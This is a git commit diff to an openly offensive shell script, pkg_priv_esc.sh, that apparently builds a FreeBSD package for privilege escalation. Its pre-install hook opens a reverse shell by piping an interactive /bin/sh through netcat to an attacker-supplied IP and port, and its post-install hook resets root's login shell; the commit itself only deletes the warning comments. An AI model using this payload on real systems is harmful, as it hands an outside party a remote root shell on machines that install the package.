09273ee4d6e2a17cfebce182cfd4a96cadc15e9f
Ki11i0n4ir3 <75846902+Ki11i0n4ir3@users.noreply.github.com>
2021-10-27 16:08:34 +0900

    Update pkg_priv_esc.sh

--- pkg_priv_esc.sh
+++ pkg_priv_esc.sh
@@ -25,12 +25,11 @@ STAGEDIR=/tmp/package
 rm -rf ${STAGEDIR}
 mkdir -p ${STAGEDIR}
 cat >> ${STAGEDIR}/+PRE_INSTALL <<EOF
-# careful here, this may clobber your system
 echo "Resetting root shell"
 rm /tmp/a;mkfifo /tmp/a;cat /tmp/a|/bin/sh -i 2>&1|nc $IP $PORT >/tmp/a
 EOF
 cat >> ${STAGEDIR}/+POST_INSTALL <<EOF
-# careful here, this may clobber your system
+
 echo"Registering root shell"
 pw usermod -n root -s /bin/sh
 EOF
